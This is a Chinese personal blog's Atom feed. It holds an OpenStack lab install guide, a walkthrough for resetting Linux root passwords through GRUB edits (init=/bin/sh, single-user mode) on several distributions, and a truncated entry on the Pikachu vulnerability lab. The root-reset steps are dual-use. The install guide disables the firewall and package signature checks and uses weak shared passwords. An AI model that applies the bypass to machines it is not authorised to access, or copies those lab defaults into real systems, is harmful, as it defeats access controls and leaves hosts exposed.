<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>做 讓 人 远 远 聽 見 的 風</title>
  
  <subtitle>杰伦的博客</subtitle>
  <link href="https://jielunya.github.io/atom.xml" rel="self"/>
  
  <link href="https://jielunya.github.io/"/>
  <updated>2022-11-28T04:09:35.742Z</updated>
  <id>https://jielunya.github.io/</id>
  
  <author>
    <name>JieLun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搭建openstack平台</title>
    <link href="https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/"/>
    <id>https://jielunya.github.io/2022/11/26/%E6%90%AD%E5%BB%BAopenstack%E5%B9%B3%E5%8F%B0/</id>
    <published>2022-11-25T20:38:03.000Z</published>
    <updated>2022-11-28T04:09:35.742Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置ip地址、配置主机名"><a href="#配置ip地址、配置主机名" class="headerlink" title="配置ip地址、配置主机名"></a>配置ip地址、配置主机名</h2><p>controller节点：<br>网卡1：192.168.100.10<br>网卡2：192.168.200.10<br>compute节点：<br>网卡1：192.168.100.20<br>网卡2：192.168.200.20</p><p>网卡1为仅主机模式，网卡2为NAT模式</p><h4 id="cotroller-ifcfg-ens33"><a href="#cotroller-ifcfg-ens33" class="headerlink" title="cotroller ifcfg-ens33"></a>cotroller ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=4a667240-2f76-4ddc-b0b1-65bbe67ca7d5</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.10</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="cotroller-ifcfg-ens34"><a href="#cotroller-ifcfg-ens34" class="headerlink" title="cotroller ifcfg-ens34"></a>cotroller ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=3de5461f-2339-4cda-8b46-4df997c74bd5</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.10</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens33"><a href="#compute-ifcfg-ens33" class="headerlink" title="compute ifcfg-ens33"></a>compute ifcfg-ens33</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=ef0eaa9c-1330-4616-85d7-9a91ac44a596</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.100.20</span><br><span class="line">PREFIX=24</span><br></pre></td></tr></table></figure><h4 id="compute-ifcfg-ens34"><a href="#compute-ifcfg-ens34" class="headerlink" title="compute ifcfg-ens34"></a>compute ifcfg-ens34</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens34</span><br><span class="line">UUID=fb2363f3-8c7b-4bca-a6e5-5e23827cc644</span><br><span class="line">DEVICE=ens34</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.200.20</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.200.2</span><br></pre></td></tr></table></figure><h4 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]hostnamectl set-hostname controller</span><br><span class="line">[root@compute ~]hostnamectl set-hostname compute</span><br></pre></td></tr></table></figure><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><p>compute节点,添加一块100g硬盘<br>fdisk &#x2F;dev&#x2F;sdb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令（输入m获取帮助）：n</span><br><span class="line">Selct（default p）：p</span><br><span class="line">分区号：1</span><br><span class="line">起始 扇区（2048-209715199，默认为2058）：</span><br><span class="line">Last扇区：+10G</span><br><span class="line"></span><br><span class="line">命令（输入m获取帮助）：n</span><br><span class="line">Selct（default p）：p</span><br><span class="line">分区号：2</span><br><span class="line">起始 扇区（2048-209715199，默认为2058）：</span><br><span class="line">Last扇区：+10G</span><br><span class="line"></span><br><span class="line">w保存</span><br></pre></td></tr></table></figure><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><h4 id="【controller】"><a href="#【controller】" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@controller ~]mkdir bak</span><br><span class="line">[root@controller ~]mv *.repo bak</span><br><span class="line">[root@controller ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h4 id="【compute】"><a href="#【compute】" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute ~]cd /etc/yum.repos.d/</span><br><span class="line">[root@compute ~]mkdir bak</span><br><span class="line">[root@compute ~]mv *.repo bak</span><br><span class="line">[root@compute ~]vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://192.168.100.10/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure><h2 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h2><h4 id="【controller】-1"><a href="#【controller】-1" class="headerlink" title="【controller】"></a>【controller】</h4><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择CentOS-7-x86_64-DVD-1804.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# mkdir /opt/centos</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/centos/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><p>在虚拟机右下角设置CD&#x2F;DVD<br>选择chinaskills_cloud_iaas.iso镜像，并连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mount -o loop /dev/cdrom /mnt/</span><br><span class="line">[root@controller ~]# cp -rvf /mnt/* /opt/</span><br><span class="line">[root@controller ~]# umount /mnt/</span><br></pre></td></tr></table></figure><h2 id="搭建ftp服务器，开启并设置自启"><a href="#搭建ftp服务器，开启并设置自启" class="headerlink" title="搭建ftp服务器，开启并设置自启"></a>搭建ftp服务器，开启并设置自启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install vsftpd –y</span><br><span class="line">[root@controller ~]# vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">添加 anon_root=/opt/</span><br><span class="line">wq!保存退出</span><br><span class="line">[root@controller ~]# systemctl start vsftpd</span><br><span class="line">[root@controller ~]# systemctl enable vsftpd</span><br></pre></td></tr></table></figure><h2 id="关闭防火墙配置selinux"><a href="#关闭防火墙配置selinux" class="headerlink" title="关闭防火墙配置selinux"></a>关闭防火墙配置selinux</h2><h4 id="【controller-x2F-compute】"><a href="#【controller-x2F-compute】" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure><h2 id="清除缓存，验证-yum-源"><a href="#清除缓存，验证-yum-源" class="headerlink" title="清除缓存，验证 yum 源"></a>清除缓存，验证 yum 源</h2><h4 id="【controller-x2F-compute】-1"><a href="#【controller-x2F-compute】-1" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum clean all</span><br><span class="line"># yum list</span><br></pre></td></tr></table></figure><h2 id="编辑环境变量"><a href="#编辑环境变量" class="headerlink" title="编辑环境变量"></a>编辑环境变量</h2><h4 id="【controller-x2F-compute】-2"><a href="#【controller-x2F-compute】-2" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum install iaas-xiandian -y</span><br></pre></td></tr></table></figure><h4 id="【controller】-2"><a href="#【controller】-2" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##--------------------system Config--------------------##</span><br><span class="line">##Controller Server Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##Controller HOST Password. example:000000</span><br><span class="line">HOST_PASS=000000</span><br><span class="line"></span><br><span class="line">##Controller Server hostname. example:controller</span><br><span class="line">HOST_NAME=controller</span><br><span class="line"></span><br><span class="line">##Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.20</span><br><span class="line"></span><br><span class="line">##Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">##Compute Node hostname. example:compute</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"></span><br><span class="line">##--------------------Chrony Config-------------------##</span><br><span class="line">##Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span><br><span class="line">network_segment_IP=192.168.100.0/24</span><br><span class="line"></span><br><span class="line">##--------------------Rabbit Config ------------------##</span><br><span class="line">##user for rabbit. example:openstack</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"></span><br><span class="line">##Password for rabbit user .example:000000</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------MySQL Config---------------------##</span><br><span class="line">##Password for MySQL root user . exmaple:000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Keystone Config------------------##</span><br><span class="line">##Password for Keystore admin user. exmaple:000000</span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql keystore user. exmaple:000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Glance Config--------------------##</span><br><span class="line">##Password for Mysql glance user. exmaple:000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore glance user. exmaple:000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Nova Config----------------------##</span><br><span class="line">##Password for Mysql nova user. exmaple:000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore nova user. exmaple:000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Neturon Config-------------------##</span><br><span class="line">##Password for Mysql neutron user. exmaple:000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore neutron user. exmaple:000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"></span><br><span class="line">##metadata secret for neutron. exmaple:000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"></span><br><span class="line">##Tunnel Network Interface. example:x.x.x.x</span><br><span class="line">INTERFACE_IP=192.168.100.10</span><br><span class="line"></span><br><span class="line">##External Network Interface. example:eth1</span><br><span class="line">INTERFACE_NAME=ens34</span><br><span class="line"></span><br><span class="line">##External Network The Physical Adapter. example:provider</span><br><span class="line">Physical_NAME=provider</span><br><span class="line"></span><br><span class="line">##First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101</span><br><span class="line">minvlan=101</span><br><span class="line"></span><br><span class="line">##Last Vlan ID in VLAN RANGE for VLAN Network. example:200</span><br><span class="line">maxvlan=200</span><br><span class="line"></span><br><span class="line">##--------------------Cinder Config--------------------##</span><br><span class="line">##Password for Mysql cinder user. exmaple:000000</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore cinder user. exmaple:000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"></span><br><span class="line">##Cinder Block Disk. example:md126p3</span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"></span><br><span class="line">##--------------------Swift Config---------------------##</span><br><span class="line">##Password for Keystore swift user. exmaple:000000</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"></span><br><span class="line">##The NODE Object Disk for Swift. example:md126p4.</span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"></span><br><span class="line">##The NODE IP for Swift Storage Network. example:x.x.x.x.</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.100.20</span><br><span class="line"></span><br><span class="line">##--------------------Heat Config----------------------##</span><br><span class="line">##Password for Mysql heat user. exmaple:000000</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore heat user. exmaple:000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Zun Config-----------------------##</span><br><span class="line">##Password for Mysql Zun user. exmaple:000000</span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Zun user. exmaple:000000</span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Mysql Kuryr user. exmaple:000000</span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Kuryr user. exmaple:000000</span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Ceilometer Config----------------##</span><br><span class="line">##Password for Gnocchi ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore ceilometer user. exmaple:000000</span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------AODH Config----------------##</span><br><span class="line">##Password for Mysql AODH user. exmaple:000000</span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore AODH user. exmaple:000000</span><br><span class="line">AODH_PASS=000000</span><br><span class="line"></span><br><span class="line">##--------------------Barbican Config----------------##</span><br><span class="line">##Password for Mysql Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"></span><br><span class="line">##Password for Keystore Barbican user. exmaple:000000</span><br><span class="line">BARBICAN_PASS=000000</span><br></pre></td></tr></table></figure><h4 id="【controller】-3"><a href="#【controller】-3" class="headerlink" title="【controller】"></a>【controller】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /etc/xiandian/openrc.sh root@192.168.100.20:/etc/xiandian</span><br></pre></td></tr></table></figure><h4 id="【compute】-1"><a href="#【compute】-1" class="headerlink" title="【compute】"></a>【compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure><p>修改一个地方即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INTERFACE_IP=192.168.100.20</span><br></pre></td></tr></table></figure><h2 id="安装openstack包"><a href="#安装openstack包" class="headerlink" title="安装openstack包"></a>安装openstack包</h2><h4 id="【controller-x2F-compute】-3"><a href="#【controller-x2F-compute】-3" class="headerlink" title="【controller&#x2F;compute】"></a>【controller&#x2F;compute】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行脚本命令iaas-pre-host.sh进行安装</span><br><span class="line"># 安装完成后同时重启</span><br><span class="line">[root@controller ~]# reboot</span><br></pre></td></tr></table></figure><h2 id="安装Mysql数据库服务"><a href="#安装Mysql数据库服务" class="headerlink" title="安装Mysql数据库服务"></a>安装Mysql数据库服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-mysql.sh</span><br></pre></td></tr></table></figure><h2 id="安装Keystone认证服务"><a href="#安装Keystone认证服务" class="headerlink" title="安装Keystone认证服务"></a>安装Keystone认证服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-keystone.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~]# source /etc/keystone/admin-openrc.sh  #使环境生效</span><br></pre></td></tr></table></figure><h2 id="安装Glance镜像服务"><a href="#安装Glance镜像服务" class="headerlink" title="安装Glance镜像服务"></a>安装Glance镜像服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-glance.sh</span><br></pre></td></tr></table></figure><h2 id="安装Nova计算服务"><a href="#安装Nova计算服务" class="headerlink" title="安装Nova计算服务"></a>安装Nova计算服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-nova-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure><h2 id="安装Neutron网络服务"><a href="#安装Neutron网络服务" class="headerlink" title="安装Neutron网络服务"></a>安装Neutron网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-neutron-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-neutron-compute.sh</span><br></pre></td></tr></table></figure><h2 id="安装Dashboard服务"><a href="#安装Dashboard服务" class="headerlink" title="安装Dashboard服务"></a>安装Dashboard服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-dashboard.sh</span><br></pre></td></tr></table></figure><h2 id="有了上面这些步骤就可以完成基本平台需求了，后面的操作根据需要在安装。"><a href="#有了上面这些步骤就可以完成基本平台需求了，后面的操作根据需要在安装。" class="headerlink" title="有了上面这些步骤就可以完成基本平台需求了，后面的操作根据需要在安装。"></a>有了上面这些步骤就可以完成基本平台需求了，后面的操作根据需要在安装。</h2><p>登录OpenStack云平台<br>在浏览器中输入<a href="http://192.168.100.10/dashboard">http://192.168.100.10/dashboard</a><br>Domain:demo 用户名:admin 密码:000000</p><h2 id="安装Cinder块存储服务"><a href="#安装Cinder块存储服务" class="headerlink" title="安装Cinder块存储服务"></a>安装Cinder块存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-cinder-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]iaas-install-cinder-compute.sh</span><br></pre></td></tr></table></figure><h2 id="安装Swift对象存储服务"><a href="#安装Swift对象存储服务" class="headerlink" title="安装Swift对象存储服务"></a>安装Swift对象存储服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] iaas-install-swift-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-swift-compute.sh</span><br></pre></td></tr></table></figure><h2 id="安装Heat编配服务"><a href="#安装Heat编配服务" class="headerlink" title="安装Heat编配服务"></a>安装Heat编配服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-heat.sh</span><br></pre></td></tr></table></figure><h2 id="安装Zun服务"><a href="#安装Zun服务" class="headerlink" title="安装Zun服务"></a>安装Zun服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@compute ~] iaas-install-zun-compute.sh</span><br></pre></td></tr></table></figure><p>以CentOS7_1804.tar镜像为例<br>CentOS7_1804.tar镜像包存放在XianDian-IaaS-v2.4.iso镜像包中。将docker镜像上传到glance中，通过openstack使用镜像启动容器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] source /etc/keystone/admin-openrc.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~] openstack image create centos7.5 --public --container-format docker --disk-format raw &lt; CentOS7_1804.tar10.14</span><br></pre></td></tr></table></figure><p>通过glance存储镜像启动容器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] zun run --image-driver glance centos7.5</span><br><span class="line"></span><br><span class="line">[root@controller ~] zun list</span><br></pre></td></tr></table></figure><h2 id="安装Ceilometer监控服务"><a href="#安装Ceilometer监控服务" class="headerlink" title="安装Ceilometer监控服务"></a>安装Ceilometer监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-ceilometer-controller.sh进行安装</span><br><span class="line"></span><br><span class="line">[root@compute ~] iaas-install-ceilometer-compute.sh进行安装</span><br></pre></td></tr></table></figure><h2 id="安装Aodh监控服务"><a href="#安装Aodh监控服务" class="headerlink" title="安装Aodh监控服务"></a>安装Aodh监控服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]iaas-install-aodh.sh</span><br></pre></td></tr></table></figure><h2 id="添加控制节点资源到云平台"><a href="#添加控制节点资源到云平台" class="headerlink" title="添加控制节点资源到云平台"></a>添加控制节点资源到云平台</h2><p>把compute节点的IP和主机名改为controller节点的IP和主机名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~] vi /etc/xiandian/openrc.sh </span><br><span class="line"></span><br><span class="line">#Compute Node Manager IP. example:x.x.x.x</span><br><span class="line">HOST_IP_NODE=192.168.100.10</span><br><span class="line"></span><br><span class="line">#Compute HOST Password. example:000000</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line">#Compute Node hostname. example:compute</span><br><span class="line">HOST_NAME_NODE=controller</span><br><span class="line"></span><br><span class="line">[root@controller ~] iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置ip地址、配置主机名&quot;&gt;&lt;a href=&quot;#配置ip地址、配置主机名&quot; class=&quot;headerlink&quot; title=&quot;配置ip地址、配置主机名&quot;&gt;&lt;/a&gt;配置ip地址、配置主机名&lt;/h2&gt;&lt;p&gt;controller节点：&lt;br&gt;网卡1：192.168.1</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>各种linux的密码重置</title>
    <link href="https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>https://jielunya.github.io/2022/11/23/%E5%90%84%E7%A7%8Dlinux%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</id>
    <published>2022-11-22T18:38:03.000Z</published>
    <updated>2022-11-22T19:07:41.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Centos6"><a href="#Centos6" class="headerlink" title="Centos6"></a>Centos6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">修改GRUB引导，在rhgb quiet最后加&quot;空格&quot;，然后</span><br><span class="line"></span><br><span class="line">键入&quot;1&quot;或&quot;s&quot;或&quot;S&quot;或&quot;single&quot;都可以，最后回车保</span><br><span class="line"></span><br><span class="line">存并返回上一步</span><br><span class="line"></span><br><span class="line">以单用户运行系统，按键盘的”B”键，进入引导系统</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br><span class="line"></span><br><span class="line">reboot重启</span><br></pre></td></tr></table></figure><h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先启动系统，在出现选择操作系统时，直接按E键</span><br><span class="line"></span><br><span class="line">进入grub界面</span><br><span class="line"></span><br><span class="line">按方向键↑和↓，将光标一直移动到 LANG=en_US.UTF-8 后面</span><br><span class="line"></span><br><span class="line">再添加“_init=/bin/sh” (_为空格键)</span><br><span class="line"></span><br><span class="line">即添加一个空格，再添加init=/bin/sh</span><br><span class="line"></span><br><span class="line">这里特别注意，需要写在UTF-8后，保持在同一行，并注意空格不能缺</span><br><span class="line"></span><br><span class="line">再按ctrl+x进入单用户视图</span><br><span class="line"></span><br><span class="line">以rw方式重新挂载</span><br><span class="line"></span><br><span class="line">mount -o remount,rw /</span><br><span class="line"></span><br><span class="line">输入passwd root修改密码</span><br></pre></td></tr></table></figure><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启kali系统进入选择界面，在这里选择Kali GNU/Linux，按下键盘中的e键进入恢复模式</span><br><span class="line"></span><br><span class="line">将光标移动到echo的末端，并输入一行代码：rw single init=/bin/bash</span><br><span class="line"></span><br><span class="line">按下ctrl+x，等待片刻跳出命令行界面</span><br><span class="line"></span><br><span class="line">在命令行中输入passwd root，并按下回车，进行一个root密码的更改</span><br></pre></td></tr></table></figure><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重启Uubuntu18.04，长按 shift 进入以下界面，选择Ubuntu高级选项</span><br><span class="line"></span><br><span class="line">进入以下画面，按e进入(recovery mode)，编辑kernel启动参数</span><br><span class="line"></span><br><span class="line">删除红色标记部分。删除”ro recovery nomodeset”</span><br><span class="line"></span><br><span class="line">在刚才删除的后面添加 “quiet splash rw init=/bin/bash”</span><br><span class="line"></span><br><span class="line">Windows平台按下F10重新引导，Mac系统按下Ctrl + x重新引导</span><br><span class="line"></span><br><span class="line">使用passwd命令免密修改root免密</span><br><span class="line"></span><br><span class="line">重启系统，以root用户进入系统</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Centos6&quot;&gt;&lt;a href=&quot;#Centos6&quot; class=&quot;headerlink&quot; title=&quot;Centos6&quot;&gt;&lt;/a&gt;Centos6&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>pikachu笔记(持续更新)</title>
    <link href="https://jielunya.github.io/2022/11/21/pikachu%E7%AC%94%E8%AE%B0(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
    <id>https://jielunya.github.io/2022/11/21/pikachu%E7%AC%94%E8%AE%B0(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</id>
    <published>2022-11-21T12:38:19.903Z</published>
    <updated>2022-11-30T12:27:50.431Z</updated>
    
